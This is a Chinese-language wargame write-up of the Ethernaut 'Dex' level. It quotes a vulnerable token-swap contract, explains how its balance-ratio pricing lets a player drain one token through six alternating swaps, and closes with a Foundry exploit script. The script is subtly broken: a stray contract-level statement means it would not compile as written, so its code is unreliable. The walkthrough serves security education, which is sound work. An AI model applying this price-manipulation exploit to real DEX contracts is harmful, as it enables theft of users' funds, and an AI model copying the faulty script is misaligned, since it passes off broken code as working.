# Level 22 - Dex
## 題目
[Dex](https://ethernaut.openzeppelin.com/level/0xB468f8e42AC0fAe675B56bc6FDa9C0563B61A52F)

### 通關條件
The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.

You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.

You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.

**Quick note**
Normally, when you make a swap with an ERC20 token, you have to approve the contract to spend your tokens for you. To keep with the syntax of the game, we've just added the approve method to the contract itself. So feel free to use contract.approve(contract.address, <uint amount>) instead of calling the tokens directly, and it will automatically approve spending the two tokens by the desired amount. Feel free to ignore the SwappableToken contract otherwise.

### 提示
- token 的價格是如何計算的？
- `swap` 是怎麼運作的？
- 如何進行 approve ERC20 交易？
- 與合約互動的方式不只一種！
- Remix might help
- 「地址」有什麼作用？
### 合約內容
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract Dex is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```
    
## 解題

### token 的價格是如何計算的？
在關卡合約的 `getSwapPrice()` 中可以找到：
```solidity
function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
    return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
}
```
公式也就是：
    $$  Amount(token2) = \frac{Amount(token1) * Balance(token2)}{Balance(token1)} $$

### `swap` 是怎麼運作的？
`swap` 就是可以讓你把身上的 Token 丟進去換成另一種 Token，換的數量就是從上面的 function 計算出來的。
```solidity=23
function swap(address from, address to, uint256 amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint256 swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
}
```
- 24 行：確保是關卡處理的兩種特定 token
- 25 行：確保呼叫者身上有足夠的 token 進行交易
- 26 行：計算交換價格
- 27 行：執行匯入
- 28, 29 行：將交換的 token 匯出 
### 如何進行approve ERC20 交易？
在 [Level 15 - Naught Coin](https://hackmd.io/@D13/ethernaut15) 中有介紹過，使用 `approve(address _spender, uint256 _value)` 允許 _spender 可以控制你 _value 個代幣，使用後授權額度會增加，這題應該是用於授權關卡交易我們身上的 token。


---

關卡目標是要我們講某一個 token 全數換出。這題其實不是程式上有漏洞，是決定價格的公式設計有漏洞，該公式如果重複把自己身上的某種 token 全部投進去交換的話，會導致關卡內的 token 儲量最後歸零：

|step|  `getSwapPrice()`| Dex Token1 | Dex Token2 | Player Token1 | Player Token2 |
| ---| -------- | -------- | -------- |-------- |-------- |
| | init     | 100     | 100     |10     | 10     |
| 1| player token2 = 10*100/100     | 110     | 90     |0     | 20     |
| 2| player token1 = 20*110/90     | 86     | 110     |24     | 0     |
| 3| player token2 = 24*110/86     | 110     | 80     |0     | 30     |
| 4| player token1 = 30*110/80     | 69     | 110     |41     | 0     |
| 5| player token2 = 41*110/69     | 110     | 45     |0     | 65     |
| 6| player token1 = 45*110/45     | 0     | 90     |110     | 20     |

透過上表可以確認，經過六次 `swap()` 後，就可以達到關卡條件，攻擊合約如下（記得要先 `approve()` 關卡進行交易）：
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/22_Dex.sol";

contract ExploitScript is Script {
    Dex level22 = Dex(payable(your_challenge_address));
    address token1 = level22.token1();
    address token2 = level22.token2();
    IERC20(token1).balanceOf(address(this));
    function run() external {
        vm.startBroadcast();
        
        level22.approve(address(level22), type(uint).max);
        level22.swap(token1, token2, 10);
        level22.swap(token2, token1, 20);
        level22.swap(token1, token2, 24);
        level22.swap(token2, token1, 30);
        level22.swap(token1, token2, 41);
        level22.swap(token2, token1, 45);

        vm.stopBroadcast();
    }
}
```